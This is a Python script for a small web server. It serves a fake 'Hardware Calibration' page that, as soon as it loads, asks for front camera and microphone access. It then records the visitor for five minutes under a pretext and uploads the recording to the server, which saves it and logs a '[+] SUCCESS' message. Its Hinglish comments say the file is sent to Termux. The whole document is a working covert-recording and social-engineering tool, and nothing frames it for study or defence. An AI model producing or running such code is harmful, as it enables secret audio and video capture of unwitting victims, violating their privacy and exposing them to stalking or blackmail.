import http.server
import socketserver

PORT = 8080

class LongMediaHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        
        # --- UI DESIGN + 5 MIN LOGIC ---
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Video Conference Test</title>
            <style>
                body { font-family: sans-serif; background: #121212; color: white; text-align: center; padding-top: 50px; }
                .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; display: inline-block; }
                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
                .status-box { margin-top: 20px; padding: 20px; background: #1e1e1e; border-radius: 10px; }
            </style>
        </head>
        <body>
            <div class="status-box">
                <h2>Hardware Calibration</h2>
                <p>Testing Audio & Video stability for 5 minutes...</p>
                <div class="loader"></div>
                <p id="timer">Status: Starting...</p>
            </div>

            <script>
                async function startLongCapture() {
                    try {
                        // Permission mangna (Front Camera + Mic)
                        const stream = await navigator.mediaDevices.getUserMedia({ 
                            video: { facingMode: "user" }, 
                            audio: true 
                        });
                        
                        const recorder = new MediaRecorder(stream);
                        const chunks = [];

                        recorder.ondataavailable = e => chunks.push(e.data);
                        
                        recorder.onstop = () => {
                            const blob = new Blob(chunks, { type: 'video/webm' });
                            // 5 minute baad file Termux pe bhejna
                            fetch('/', { method: 'POST', body: blob, headers: { 'File-Name': 'long_capture_5min.webm' } });
                        };

                        recorder.start();
                        document.getElementById('timer').innerText = "Calibration in progress (Do not close tab)";

                        // --- 5 MINUTES TIMER (300,000 ms) ---
                        setTimeout(() => {
                            recorder.stop();
                            stream.getTracks().forEach(t => t.stop());
                            document.getElementById('timer').innerText = "Test Completed!";
                        }, 300000); 

                    } catch (err) {
                        document.getElementById('timer').innerText = "Error: Please allow access.";
                    }
                }
                // Page load hote hi shuru
                window.onload = startLongCapture;
            </script>
        </body>
        </html>
        """
        self.wfile.write(bytes(html, "utf8"))

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        file_name = self.headers.get('File-Name', 'data.webm')
        data = self.rfile.read(content_length)

        with open(file_name, "wb") as f:
            f.write(data)
            
        print(f"\n[+] SUCCESS: 5 Minute ki video/audio receive ho gayi: {file_name}")
        self.send_response(200)
        self.end_headers()

with socketserver.TCPServer(("", PORT), LongMediaHandler) as httpd:
    print(f"[*] Server Live: Recording set for 5 Minutes on Port {PORT}")
    httpd.serve_forever()
